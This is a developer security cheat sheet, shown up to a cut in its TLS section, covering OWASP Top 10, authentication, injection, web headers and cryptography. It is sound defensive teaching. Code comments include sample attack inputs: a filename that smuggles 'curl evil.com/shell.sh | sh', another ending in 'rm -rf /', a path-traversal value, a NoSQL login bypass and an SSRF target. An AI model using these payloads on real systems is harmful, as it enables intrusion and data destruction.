**The Security Cheat Sheet**

**A field guide for developers shipping real software**

*OWASP Top 10 (2025), modern auth, supply chain, AI/LLM threats, and
practical defenses*

JavaScript examples throughout

**Chapter 1 --- How to think about security**

Security is not a feature you add. It is a property of how you make
every decision --- what to log, what to trust, what to validate, what to
expose. The goal of this guide is not to scare you with attack
scenarios; it is to give you the mental models and reflexes that make
secure software the default rather than the exception.

**The mindset shift**

Most application bugs are about producing the right output for valid
input. Security bugs are about what happens with invalid, malicious, or
unexpected input --- input crafted specifically to make your system do
something its designers did not anticipate. This is a different
question, and asking it consistently is the skill.

Three principles that, applied to every line of code, eliminate the
majority of vulnerabilities:

- **Never trust input.** Anything that crosses a trust boundary --- HTTP
  requests, file uploads, environment variables, third-party API
  responses, even values from your own database written by an earlier
  process --- is hostile until you have explicitly validated and
  constrained it.

- **Defense in depth.** Assume each individual control will fail.
  Validate input AND escape output. Use a WAF AND parameterize queries.
  Authenticate users AND authorize each action. A breach should require
  multiple failures, not one.

- **Least privilege.** Every component --- user account, service, API
  key, database connection, container --- should have exactly the
  permissions it needs and nothing more. When (not if) it gets
  compromised, the blast radius is contained.

**STRIDE: a model for finding threats**

Before you build a feature, walk through STRIDE --- six categories of
threat that cover almost every attack you will face:

- **Spoofing ---** attacker pretends to be someone else. Defense:
  authentication.

- **Tampering ---** attacker modifies data in transit or at rest.
  Defense: integrity checks, TLS, signed tokens.

- **Repudiation ---** user denies doing something they did. Defense:
  audit logs.

- **Information disclosure ---** attacker reads data they shouldn't.
  Defense: encryption, access control, careful error messages.

- **Denial of service ---** attacker makes your system unavailable.
  Defense: rate limiting, resource quotas, scaling.

- **Elevation of privilege ---** attacker gains capabilities they
  shouldn't have. Defense: authorization checks on every action.

When designing a feature, ask: "How could each of these go wrong
here?" The answers become your threat model.

**The attack surface**

Your attack surface is every place where untrusted input or untrusted
actors can interact with your system. Common entry points:

- HTTP endpoints (especially auth, file upload, search, anything taking
  user input)

- WebSocket and gRPC interfaces

- Email parsers, webhook receivers, OAuth callbacks

- File uploads (parsed by your code or downstream tools)

- Anything reading from an external API, queue, or storage bucket

- Admin interfaces, even "internal" ones (they leak)

- Third-party JavaScript loaded by your frontend

- Build pipelines and developer machines

The smaller you keep this surface, the less you have to defend. Disable
features you don't use. Don't expose admin endpoints to the internet.
Don't accept file types you don't need to.

> **The single highest-ROI security habit**
>
> Before merging any code that touches user input or authentication,
> ask: "What if an attacker controls this value?" Walk through it. If
> you can't immediately articulate why the answer is safe, you have a
> bug. This habit alone catches a substantial fraction of real-world
> vulnerabilities.

**Chapter 2 --- The OWASP Top 10 (2025)**

OWASP releases its Top 10 list every four years; the current edition is
OWASP Top 10:2025, finalized in late 2025. It is the most widely-cited
application security reference in the industry, used as the baseline for
ISO 27001, SOC 2, PCI DSS, and HIPAA compliance audits. If you only
memorize one security framework, memorize this one.

The 2025 edition shifts focus toward the software ecosystem --- supply
chain, configuration, and operational resilience --- while reordering
several traditional categories. Two new categories were added (Software
Supply Chain Failures and Mishandling of Exceptional Conditions). SSRF
was rolled into Broken Access Control.

**A01:2025 --- Broken Access Control**

Number one for the second cycle running. Access control is broken when
users (or attackers) can perform actions or access resources they
shouldn't. This category absorbed SSRF in 2025, recognizing that
server-side request forgery is fundamentally an authorization failure
--- the server makes a request on behalf of a user, with the server's
privileges, against resources the user shouldn't reach.

Common forms:

- Insecure Direct Object Reference (IDOR) --- /api/orders/12345 where
  the user can change 12345 to access someone else's order

- Missing function-level access checks --- admin endpoints accessible to
  regular users

- Privilege escalation through manipulated request parameters ---
  sending isAdmin=true in a profile update

- Force-browsing to authenticated pages without going through auth

- SSRF --- getting the server to make HTTP requests to internal
  services, cloud metadata endpoints (169.254.169.254 for IAM
  credentials), or other attacker-chosen destinations

The fix is conceptually simple and operationally hard: authorize every
action, server-side, based on the authenticated user, not on any
client-supplied claim about their identity. Deny by default.

```js
// WRONG: trusts the client to send the right userId
app.get('/api/orders/:id', async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order); // any user can read any order
});

// RIGHT: derives identity from the session, checks ownership
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.json(order);
});
```

> **Use 404, not 403**
>
> When access is denied, returning 404 (not found) rather than 403
> (forbidden) prevents attackers from confirming that a resource
> exists. This is a small but useful defense against enumeration
> attacks.

**A02:2025 --- Security Misconfiguration**

Moved from #5 to #2. Configuration mistakes --- default credentials,
debug endpoints in production, public S3 buckets, overly permissive
CORS, missing security headers --- are increasingly the source of major
breaches. The modern cloud stack has so many configuration surfaces that
mistakes are inevitable without automation.

The checklist:

- No default credentials anywhere (database, admin panel, API keys)

- Debug mode, stack traces, and verbose error messages disabled in
  production

- No unnecessary services or features enabled

- Security headers configured (covered in Chapter 5)

- Cloud storage buckets default-private; explicit allowlisting for
  public ones

- Cloud IAM follows least privilege; no "AdministratorAccess" on
  production resources

- Infrastructure-as-code (Terraform, CloudFormation) scanned for
  misconfigurations

- Container images don't run as root, don't include shells unless
  needed

**A03:2025 --- Software Supply Chain Failures (new)**

A new top-three category capturing what was previously called
"Vulnerable and Outdated Components" but expanded significantly.
Modern applications pull hundreds to thousands of dependencies; each one
is code from a stranger running with your application's privileges. The
2024 XZ Utils backdoor and the 2025 npm typosquatting waves made supply
chain a board-level concern.

What this category covers:

- Outdated dependencies with known CVEs

- Typosquatting --- installing 'reqeust' instead of 'request' and
  getting a backdoor

- Compromised maintainer accounts pushing malicious updates

- Malicious code in build tools, CI/CD pipelines, or IDE extensions

- Container base images with embedded malware

- Unverified post-install scripts (npm install runs arbitrary code by
  default)

Defenses, in priority order:

- **Lockfiles.** package-lock.json, yarn.lock, pnpm-lock.yaml. Commit
  them. Don't ignore them. They pin transitive dependencies to exact
  versions and checksums.

- **Dependency scanning.** npm audit, Snyk, Dependabot, GitHub's
  security advisories. Run on every PR.

- **SBOM (Software Bill of Materials).** A machine-readable inventory of
  every component in your software. Increasingly required by enterprise
  customers and government procurement.

- **Pin versions in CI.** Don't run npm install with version ranges in
  production builds; use npm ci with the exact lockfile.

- **Verify packages.** npm install --ignore-scripts disables
  post-install scripts. Check provenance attestations where available.

- **Minimize the surface.** Audit what you actually need. Removing
  unused dependencies removes risk you don't pay for.

> **The npm ecosystem is a target**
>
> JavaScript and Python registries are the most-attacked package
> ecosystems because they're the largest and the easiest to publish
> to. Treat any new dependency as a security decision: check the
> maintainer, the download count, the last commit date, and whether it
> has post-install scripts.

**A04:2025 --- Cryptographic Failures**

Down from #2 to #4. This category is about using cryptography
incorrectly or not at all --- storing passwords in plaintext, using
broken algorithms (MD5, SHA1, DES), hardcoded keys, leaking sensitive
data through unencrypted channels.

The cardinal rules of cryptography for application developers:

- **Never invent your own.** Use battle-tested libraries (libsodium, the
  platform's crypto module). Custom crypto is wrong by default; assume
  you cannot break this rule.

- **Use TLS everywhere.** Internal services included. The era of
  "trusted network" assumptions is over.

- **Hash passwords with a slow algorithm.** Argon2id, scrypt, or bcrypt.
  Never SHA256 or MD5 --- those are designed to be fast, which is the
  opposite of what you want.

- **Use authenticated encryption.** AES-GCM or ChaCha20-Poly1305. Never
  AES-CBC without a separate MAC --- that pattern has been the source of
  countless padding oracle attacks.

- **Random means cryptographically random.** Math.random() is not random
  for security purposes. Use crypto.randomBytes() in Node.

```js
// WRONG: fast hash, no salt, predictable
const hash = crypto.createHash('sha256').update(password).digest('hex');

// RIGHT: slow hash with cost factor, salted, designed for passwords
const argon2 = require('argon2');
const hash = await argon2.hash(password, { type: argon2.argon2id });

// To verify later:
const ok = await argon2.verify(hash, suppliedPassword);
```

Cryptography is covered in more depth in Chapter 6.

**A05:2025 --- Injection**

Down from #3 to #5 but still hugely impactful. Injection occurs when
untrusted data is sent to an interpreter (SQL engine, OS shell, browser
HTML/JS parser, LDAP, XML parser, NoSQL query language, expression
language) as part of a command or query, and the data is interpreted as
code rather than data.

The whole category collapses to a single rule: never construct queries
or commands by concatenating strings with user input. Use parameterized
queries, prepared statements, or safe builder APIs.

```js
// SQL injection: classic vulnerability
const query = `SELECT * FROM users WHERE email = '${email}'`;
// If email = "' OR '1'='1", the WHERE clause becomes always-true

// Parameterized --- driver handles escaping
const result = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);

// Command injection: shelling out with concatenation
exec(`convert ${userFilename} output.png`); // userFilename = "x.png; rm -rf /"

// Spawn with array form --- no shell interpretation
spawn('convert', [userFilename, 'output.png']);
```

Cross-site scripting (XSS) is injection into the browser's HTML/JS
interpreter. Modern React, Vue, and Angular escape interpolated values
by default; XSS bugs almost always come from explicit escape hatches
like dangerouslySetInnerHTML, v-html, or [innerHTML]. Treat those as
you would treat raw SQL concatenation.

```js
// React: safe by default
<div>{userComment}</div> // text is escaped

// React: dangerous, needs sanitization
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// If you must, use DOMPurify:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
```

**A06:2025 --- Insecure Design**

Threats that aren't bugs in code but flaws in the architecture itself.
The classic example: a password reset flow that emails a 6-digit numeric
code and allows unlimited attempts is insecurely designed --- no
implementation correctness will save it. Other examples: business logic
that allows negative quantities to be ordered, multi-tenant SaaS with no
tenant isolation in the data model, financial flows that don't check
race conditions.

Defenses are process-level rather than code-level:

- Threat-model new features before implementing them

- Establish secure-by-default patterns once, reuse them everywhere

- Use proven libraries for risky features (auth, payments, file
  handling) --- don't roll your own

- Write "abuse cases" alongside use cases: how could this be misused?

**A07:2025 --- Authentication Failures**

Identity bugs: weak passwords accepted, credentials sent over HTTP,
session tokens that don't expire, MFA bypassable, password reset flows
that confirm whether an email is registered, missing rate limits on
login. Covered in depth in Chapter 3 since you've been researching this
area.

**A08:2025 --- Software or Data Integrity Failures**

Trusting code or data that you shouldn't. Major cases:

- Auto-update mechanisms with no signature verification

- Deserialization of untrusted data with type information (Java, .NET,
  pickle in Python) --- leads to remote code execution

- CI/CD pipelines that build from untrusted branches without review

- CDN-hosted third-party scripts loaded without Subresource Integrity
  hashes

- JWTs accepted without signature verification (a real bug, regularly
  found in audits)

The fix: sign things you care about the integrity of, and verify those
signatures before trusting the content. Don't deserialize untrusted
polymorphic data.

**A09:2025 --- Logging and Alerting Failures**

If you can't detect an attack, you can't respond to it. Most breaches
in the wild are discovered months after the initial compromise, often by
external parties. The category covers:

- Login failures, authorization failures, and input validation failures
  not logged

- Logs without enough context to investigate (no request ID, no user ID,
  no timestamp)

- Logs not centrally aggregated or monitored

- No alerting on suspicious patterns (brute force, privilege escalation
  attempts)

- Logs stored insecurely --- modifiable by an attacker who gets in

Covered in detail in Chapter 11.

**A10:2025 --- Mishandling of Exceptional Conditions (new)**

A new category for 2025. Software that fails to anticipate, detect, or
respond appropriately to unusual conditions --- errors, race conditions,
resource exhaustion, partial failures. Symptoms include:

- Stack traces returned to users (information disclosure)

- Errors that fail open rather than fail closed (auth check throws →
  request proceeds)

- Race conditions that allow double-spending, double-redemption of
  coupons, etc.

- Resource leaks that gradually degrade the system

- Crashes that destabilize the system or skip cleanup logic

The principle: when something unexpected happens, fail to the safe
state, not the available state. An authorization check that throws
should deny access, not allow it.

```js
// WRONG: try/catch makes the wrong thing happen on failure
async function canEdit(user, doc) {
  try {
    return await authService.check(user, doc, 'edit');
  } catch (e) {
    return true; // fail open --- disaster
  }
}

// RIGHT: fail closed
async function canEdit(user, doc) {
  try {
    return await authService.check(user, doc, 'edit');
  } catch (e) {
    logger.error('authz check failed', { user, doc, err: e });
    return false; // deny by default
  }
}
```

**Chapter 3 --- Authentication and authorization**

Identity is the hardest part of application security to get right and
the most expensive to get wrong. This chapter is denser than the others,
both because the topic is intrinsically complex and because protocol
confusion is the source of most real-world auth bugs.

**Authentication vs authorization**

Two distinct concepts that everyone conflates:

- **Authentication (AuthN) ---** verifying who someone is. Username and
  password, biometric, hardware key.

- **Authorization (AuthZ) ---** deciding what they're allowed to do.
  Role-based, attribute-based, ownership-based.

They are different bugs with different defenses. "User can log in as
someone else" is an AuthN bug; "User can access another tenant's
data" is an AuthZ bug. Most real systems have separate components for
each.

**Passwords (if you must)**

Modern best practice is to not handle passwords yourself --- delegate to
an identity provider (Auth0, Clerk, Supabase Auth, AWS Cognito, or a
corporate IdP via OIDC). If you do handle them, the rules:

- Hash with Argon2id, scrypt, or bcrypt (in that preference order).
  Never SHA256, never MD5.

- Enforce a minimum length (12+ characters) but skip the "must contain
  a symbol" rules --- modern NIST guidance discourages complexity
  requirements in favor of length.

- Check submitted passwords against breach databases (HaveIBeenPwned has
  a free API with a k-anonymity model).

- Rate limit login attempts. Per-account and per-IP. Lock accounts after
  enough failures but not in a way that enables denial of service.

- Never log passwords. Never send them in error messages. Never put them
  in URLs.

- Don't leak whether an email is registered --- "if this account
  exists, we sent an email" rather than "no account found."

**Multi-factor authentication**

Adding a second factor --- something other than the password --- drops
account takeover risk by 99%+. The factors, in order of strength:

- **Hardware security keys (FIDO2/WebAuthn).** Best. Phishing-resistant
  by design --- the key only releases the credential to the right
  origin.

- **TOTP (Google Authenticator, Authy).** Good. Codes from an app.
  Phishable but not network-attackable.

- **SMS.** Better than nothing but increasingly broken --- SIM-swap
  attacks are routine. Don't use as the only factor for anything that
  matters.

- **Email magic links.** Useful as a passwordless option; security
  depends on the email account itself.

**Sessions and tokens**

After authentication, you need to remember the user across requests. Two
main patterns:

**Session cookies**

The server generates a random opaque token, stores user state
server-side keyed by that token, and sends the token as a cookie. The
token is the session ID; everything else lives on the server (or in
Redis).

Set cookies correctly. The properties that matter:

```js
// Express-style cookie config
res.cookie('session', token, {
  httpOnly: true, // not accessible to JavaScript (XSS defense)
  secure: true, // HTTPS only (don't leak over HTTP)
  sameSite: 'lax', // CSRF defense; 'strict' for high-security
  maxAge: 1000 * 60 * 60 * 24 * 7, // explicit expiry
  path: '/',
  domain: undefined // leave undefined for current domain only
});
```

**JWT (JSON Web Tokens)**

A token that contains user data directly, signed by the server. No
server-side lookup needed to verify a request. Looks like
header.payload.signature, base64-encoded.

JWTs are commonly misused. The pitfalls:

- **Accepting alg:none.** Some libraries will verify a token whose
  header claims it isn't signed. Always pin the algorithm in your
  verification code.

- **Confusing HS256 and RS256.** If your verifier accepts both, an
  attacker can sign with your public key as if it were a shared secret.
  Pin the algorithm.

- **No expiration.** Set exp. Short-lived (15 min) access tokens with
  refresh tokens are the standard pattern.

- **Storing sensitive data in JWTs.** The payload is base64, not
  encrypted. Don't put secrets in it.

- **No revocation.** A signed JWT is valid until it expires; you can't
  kick a user out instantly. Keep tokens short-lived and use a
  revocation list for sensitive cases.

```js
// Verify a JWT correctly
const jwt = require('jsonwebtoken');
try {
  const payload = jwt.verify(token, secret, {
    algorithms: ['HS256'], // pin algorithm --- critical
    issuer: 'my-app',
    audience: 'my-app-users',
    maxAge: '15m'
  });
} catch (e) {
  return res.status(401).json({ error: 'Invalid token' });
}
```

**OAuth 2.0 and OIDC**

Two protocols that are almost universally confused. Both involve a third
party (Google, Microsoft, your corporate IdP) authenticating users on
your behalf. They are not the same:

- **OAuth 2.0** is an authorization framework --- "this user grants my
  app access to their resources at this other service." Issues access
  tokens.

- **OIDC (OpenID Connect)** is built on top of OAuth and adds
  authentication --- "who is this user?" Issues an ID token (a JWT
  containing identity claims).

If you want to know who the user is ("log in with Google"), you want
OIDC. If you want to call APIs on the user's behalf ("my app posts to
their Slack"), you want OAuth. Most flows combine both.

**The flows that matter**

- **Authorization Code with PKCE.** The modern default for all clients
  (web, mobile, SPA). The client redirects the user to the IdP, gets a
  code, exchanges it for tokens with a proof-of-possession check (PKCE).
  Use this.

- **Client Credentials.** Server-to-server, no user involved. Service A
  authenticates to service B with its own credentials.

- **Implicit flow.** Old SPA flow. Deprecated. Don't use.

- **Resource Owner Password Credentials.** Pass the user's password
  through your app to the IdP. Deprecated. Never use.

**PKCE --- what it actually does**

PKCE (Proof Key for Code Exchange, pronounced "pixie") prevents
authorization code interception attacks. The client generates a random
code_verifier, hashes it to a code_challenge, sends the challenge with
the authorization request, and sends the original verifier when
redeeming the code. Even if an attacker intercepts the code, they can't
redeem it without the verifier.

PKCE was originally a mobile-only mitigation; in 2025 the IETF formally
recommends it for all OAuth clients including server-side ones. If your
auth library doesn't use PKCE by default, find a better library.

**SAML**

Older identity protocol still dominant in enterprise SSO. XML-based,
complex, predates the web's modern security model. Most new
applications integrate with corporate IdPs via OIDC instead, but
enterprise customers may require SAML.

If you're implementing a SAML service provider, use a maintained
library (passport-saml, samlify, or your IdP's SDK). Do not parse SAML
XML yourself. The protocol has been the source of many catastrophic bugs
(signature confusion, XML canonicalization issues, comment-truncation
attacks) and the libraries fix most of them.

**SCIM**

System for Cross-domain Identity Management. The standard protocol for
provisioning users and groups between an IdP and your SaaS application
--- when an admin adds someone to a group in Okta, SCIM is what
propagates that to your app. REST/JSON-based, much friendlier than SAML.

SCIM matters because enterprise customers will require it (especially at
the level of SOC 2 compliance). Auth0, Okta, and Azure AD all push
SCIM-formatted requests; your application implements endpoints to
receive them. The endpoints need their own authentication (bearer token,
typically) and the same authorization rigor as the rest of your API.

**FIDO2 and WebAuthn**

FIDO2 is the umbrella standard for hardware-backed authentication;
WebAuthn is the web API for it. Together they implement passkeys ---
cryptographic credentials stored on a device (hardware key, phone secure
enclave, password manager) that authenticate to a specific origin.

Properties that make passkeys exceptional:

- Phishing-resistant --- the credential only releases for the exact
  origin it was registered to

- No shared secret on the server --- a database breach leaks public
  keys, which are useless

- Replay-resistant --- challenges are unique per authentication

- User-friendly --- no codes to type, no passwords to remember

If you're building a new app in 2026, supporting passkeys is
increasingly expected. Use a library (SimpleWebAuthn for Node, or your
IdP's passkey integration); don't implement the WebAuthn protocol from
scratch.

**Authorization patterns**

Once you know who the user is, you need to decide what they can do.
Patterns, from simplest to most powerful:

- **Role-Based Access Control (RBAC).** Users have roles (admin, editor,
  viewer); roles have permissions. Simple, well-understood, scales
  poorly when permissions need to depend on the specific resource.

- **Attribute-Based Access Control (ABAC).** Permissions are computed
  from attributes of the user, resource, and environment. Flexible but
  harder to reason about.

- **Relationship-Based Access Control (ReBAC).** Permissions follow
  relationships in a graph --- "can edit if you're a member of the
  team that owns the document." Google Zanzibar is the canonical
  implementation; OpenFGA and SpiceDB are open-source equivalents.

Whichever you pick, the cardinal rule: authorization checks live on the
server, on every action, derived from the authenticated identity. Never
trust the client's claim about what they're allowed to do.

**Chapter 4 --- Injection attacks in depth**

Injection attacks all share the same shape: a string contains both code
and data, the boundary between them is implicit, and an attacker
manipulates the data to expand into the code region. The defense is also
always the same shape: parameterize, escape, or use a structured API
that maintains the boundary explicitly.

**SQL injection**

The original. Largely solved at the framework level --- every modern ORM
and database driver supports parameterized queries --- but still appears
in the wild whenever someone reaches for raw string concatenation.

```js
// Wrong patterns:
db.query("SELECT * FROM users WHERE id = " + userId);
db.query(`SELECT * FROM users WHERE name = '${name}'`);

// Right patterns:
db.query("SELECT * FROM users WHERE id = $1", [userId]);
db.query("SELECT * FROM users WHERE name = ?", [name]);

// ORM (Prisma example) --- safe by default
prisma.user.findUnique({ where: { id: userId } });
```

Edge cases that still trip people up:

- Dynamic column or table names --- can't be parameterized; must be
  validated against an allowlist

- ORDER BY with user-supplied direction --- same problem, allowlist
  'asc' and 'desc'

- LIKE patterns with user input --- escape % and _ if the user
  shouldn't control wildcarding

- Raw query escape hatches in ORMs (Prisma's $queryRawUnsafe,
  Sequelize's literal()) --- treat as you would raw SQL

**NoSQL injection**

MongoDB and similar databases accept query operators in JSON. If you
parse user input into a query document, the user can inject operators.

```js
// Vulnerable --- user posts JSON
app.post('/login', (req, res) => {
  // req.body.email = { "$ne": null }, req.body.password = { "$ne": null }
  User.findOne({ email: req.body.email, password: req.body.password });
  // returns the first user with non-null email and password
});

// Fix: coerce to expected types
const email = String(req.body.email);
const password = String(req.body.password);
User.findOne({ email, password });

// Better: schema validation before query
const { email, password } = loginSchema.parse(req.body); // zod, joi, etc.
```

**Command injection**

Shelling out to system commands with user input is the highest-severity
injection class because it usually gives the attacker code execution as
your service account.

```js
// Catastrophic
const { exec } = require('child_process');
exec(`convert ${filename} thumb.png`);
// filename = "x.png; curl evil.com/shell.sh | sh"

// Safe: spawn with arg array, no shell
const { spawn } = require('child_process');
spawn('convert', [filename, 'thumb.png']);

// Even safer: don't shell out at all
const sharp = require('sharp');
await sharp(filename).resize(200).toFile('thumb.png');
```

If you must shell out, use spawn with an argument array (not exec with a
string). The shell is the source of injection; if you remove the shell,
you remove the attack surface.

**XSS (Cross-Site Scripting)**

Injection into the browser. Three classical forms:

- **Reflected XSS.** The attack payload is in the request and reflected
  immediately. "Click this link" attack.

- **Stored XSS.** The payload is persisted (in a comment, a profile
  field) and rendered to other users. Higher impact.

- **DOM-based XSS.** The payload never touches the server; it's parsed
  from the URL or postMessage by client-side JavaScript.

Modern frameworks (React, Vue, Angular) escape by default. The places
where XSS reappears:

- dangerouslySetInnerHTML / v-html / [innerHTML]

- href={userUrl} --- if userUrl is 'javascript:alert(1)', the click
  executes script

- Rendering markdown without sanitizing

- Reflecting user input into <script> tags, even in JSON

- Embedding user content in CSS (less common, still possible)

Defenses, layered:

- Use a framework that escapes by default. Never bypass it without a
  sanitizer.

- For user-supplied URLs, validate the protocol --- only http: and
  https: are safe.

- Content Security Policy (CSP) headers --- prevent script execution
  from unexpected origins.

- Sanitize HTML on the way in if you accept rich text --- DOMPurify is
  the standard tool.

- Use HttpOnly cookies so JavaScript can't steal session tokens even if
  XSS occurs.

**Path traversal**

User-controlled file paths that include .. or absolute paths can break
out of the intended directory.

```js
// Wrong
app.get('/download/:name', (req, res) => {
  res.sendFile('/var/files/' + req.params.name);
  // name = "../../etc/passwd" → reads /etc/passwd
});

// Right
const path = require('path');
const BASE = '/var/files';
app.get('/download/:name', (req, res) => {
  const requested = path.join(BASE, req.params.name);
  const resolved = path.resolve(requested);
  if (!resolved.startsWith(BASE + path.sep)) {
    return res.status(400).send('Invalid path');
  }
  res.sendFile(resolved);
});
```

Better still: don't accept filenames at all. Store user files by opaque
ID and look up the actual filename server-side.

**SSRF (Server-Side Request Forgery)**

Now part of A01 (Broken Access Control). Your server makes an HTTP
request based on user input --- the user supplies a URL, your server
fetches it. The user supplies an internal URL, your server fetches it
from inside your network, and the attacker reads internal resources.

Common targets for SSRF:

- Cloud metadata endpoints --- http://169.254.169.254/ on AWS/Azure/GCP
  returns IAM credentials

- Internal admin interfaces accessible only from inside the VPC

- Internal databases or caches with no auth

- Localhost services (the application's own debug endpoints)

Defenses:

- Allowlist domains you'll fetch from. Never an arbitrary user URL.

- Disable redirects, or follow them through the same validation.

- Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16,
  169.254.0.0/16, 127.0.0.0/8) --- but watch for DNS rebinding attacks
  (resolve the hostname once and use the IP).

- On AWS, enforce IMDSv2 (session-token-required metadata) which is
  immune to most SSRF patterns.

- Run outbound HTTP through a forward proxy that enforces the allowlist.

**Prompt injection (LLM-specific)**

The newest member of the injection family. If your application sends
user content to an LLM as part of a prompt, the user can inject
instructions that change the LLM's behavior. Covered in detail in
Chapter 9.

**Chapter 5 --- Web application security headers and patterns**

A pile of browser security features that protect users --- but only if
the server tells the browser to enable them.

**The security headers you should set**

- **Strict-Transport-Security (HSTS).** Forces HTTPS for your domain.
  max-age=31536000; includeSubDomains; preload. Without it, the first
  request to your domain can still be hijacked.

- **Content-Security-Policy (CSP).** Limits which sources scripts,
  styles, and other resources can be loaded from. The strongest XSS
  defense available in the browser. Start with a report-only policy,
  iterate to enforcement.

- **X-Frame-Options or CSP frame-ancestors.** Prevents your pages from
  being framed by other sites (clickjacking).

- **X-Content-Type-Options: nosniff.** Prevents browsers from guessing
  content types --- important when serving user-uploaded files.

- **Referrer-Policy.** Controls how much of the referring URL is sent to
  other origins. strict-origin-when-cross-origin is a sensible default.

- **Permissions-Policy.** Disables browser features your site doesn't
  need (camera, microphone, geolocation, payment).

```js
// Express + helmet covers most of these with sane defaults
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-RANDOM'"], // no inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"], // tighten as you can
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yourapp.com"]
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }
}));
```

**CSRF (Cross-Site Request Forgery)**

Attack: a logged-in user visits attacker.com, which submits a form to
your-bank.com. The browser sends the user's session cookie
automatically, the bank thinks the user initiated the action.

Defenses, in order of modern preference:

- **SameSite cookies.** Setting SameSite=Lax (or Strict) tells the
  browser to omit the cookie on cross-site requests. Most browsers
  default to Lax now. This alone blocks most CSRF.

- **CSRF tokens.** A server-generated random value tied to the session,
  sent in a form field or header, validated on submission. Still
  standard for state-changing requests.

- **Custom request headers.** Browsers don't allow cross-origin XHR to
  set custom headers without a CORS preflight. Requiring
  X-Requested-With: XMLHttpRequest is a partial defense.

- **Double-submit cookies.** Token sent in both a cookie and a header;
  server checks they match. Works for stateless APIs.

**CORS (Cross-Origin Resource Sharing)**

CORS is not a security feature --- it's a relaxation of the same-origin
policy. By default, browsers prevent JavaScript on one origin from
reading responses from another. CORS lets you opt in to allowing
specific other origins.

The mistakes that come up regularly:

- Access-Control-Allow-Origin: * combined with
  Access-Control-Allow-Credentials: true --- actually invalid per spec,
  browsers will reject, but the intent is dangerous

- Reflecting the Origin header without an allowlist --- effectively
  allows any origin

- Treating CORS as protection --- it protects users' browsers, not your
  server. An attacker with curl ignores CORS entirely.

```js
// Reasonable CORS config
const cors = require('cors');
app.use(cors({
  origin: (origin, callback) => {
    const allowed = ['https://app.example.com', 'https://example.com'];
    if (!origin || allowed.includes(origin)) callback(null, true);
    else callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Clickjacking**

Attack: your page is loaded in an invisible iframe on attacker.com, with
attacker-controlled UI overlaid. The user clicks what looks like "Free
iPad," actually clicks "Transfer money" on your site.

Defense: set Content-Security-Policy: frame-ancestors 'none' (or
'self' if you frame your own pages). The older X-Frame-Options: DENY
does the same thing for legacy browsers.

**Open redirects**

/login?next=https://evil.com --- the user logs in, gets redirected to
evil.com which mimics your site. Used in phishing. Defense: validate
redirect URLs against an allowlist, or only allow same-origin redirects.

**Chapter 6 --- Cryptography for application developers**

You don't need to understand the math. You need to know which
primitives to reach for, which never to use, and which patterns are
wrong even with correct primitives.

**The hierarchy of libraries**

In order of preference:

- A high-level library that does exactly what you want (bcrypt for
  passwords, jose for JWTs, age for file encryption)

- libsodium / NaCl (Node: sodium-native, libsodium-wrappers) ---
  opinionated, hard to misuse

- Your platform's standard crypto module (Node's crypto, Web Crypto
  API) --- flexible but easy to misuse

- OpenSSL bindings directly --- only if you have a specific reason

Never roll your own crypto. Never use a random crypto snippet from Stack
Overflow without understanding it.

**Symmetric encryption**

Same key encrypts and decrypts. The right choice almost always:

- **AES-256-GCM** or **ChaCha20-Poly1305.** Both provide authenticated
  encryption --- the ciphertext carries an integrity tag, so tampering
  is detected.

Anti-patterns:

- AES-CBC without a separate MAC --- vulnerable to padding oracle
  attacks

- AES-ECB --- leaks patterns in the plaintext (the famous Tux penguin
  meme)

- Reusing nonces with the same key --- catastrophic for GCM

- DIY "encrypt then base64" without thinking about authentication

```js
// AES-256-GCM with random nonce, in Node's crypto
const crypto = require('crypto');

function encrypt(plaintext, key) {
  const nonce = crypto.randomBytes(12); // 96 bits for GCM
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([nonce, tag, ciphertext]);
}

function decrypt(payload, key) {
  const nonce = payload.subarray(0, 12);
  const tag = payload.subarray(12, 28);
  const ciphertext = payload.subarray(28);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8');
}
```

**Asymmetric encryption and signatures**

Different keys for the public-facing and private operations. Used when
parties don't share a secret in advance.

- **Ed25519** for signatures. Fast, small, modern. Replaces older RSA
  and ECDSA signatures for most uses.

- **X25519** for key exchange.

- **RSA** for legacy interoperability. Use 3072-bit or larger keys.
  PKCS#1 v1.5 padding has known issues; prefer OAEP for encryption and
  PSS for signatures.

**Hashing**

Use the right hash for the right job:

- **SHA-256 / SHA-3** for general-purpose content hashing, integrity
  checks, content addressing. Fast.

- **Argon2id, scrypt, bcrypt** for passwords. Slow on purpose.
  Configurable cost factor.

- **HMAC** (any hash) for keyed message authentication.

Never use:

- MD5, SHA-1 --- broken or weakened

- SHA-256 for passwords --- too fast

- Plain hash for passwords with a custom salt scheme --- use a
  password-hashing function

**Random numbers**

Two kinds of random, and they are very different:

- **Math.random() / Random / rand()** --- statistical random.
  Predictable. Fine for simulations, animations, sampling. Never use for
  security.

- **crypto.randomBytes() / SecureRandom / getrandom()** ---
  cryptographically secure random. Use for tokens, session IDs, nonces,
  password resets, anything an attacker would benefit from guessing.

```js
// Wrong --- Math.random is predictable
const token = Math.random().toString(36).slice(2);

// Right --- crypto-secure
const token = crypto.randomBytes(32).toString('base64url');
```

**TLS / HTTPS**

Use TLS for everything. Internal services too. The "trusted network"
assumption died years ago.

The configuration that matters in 2026:

- TLS 1.2 minimum, TLS 1.3 preferred. Disable everything older.

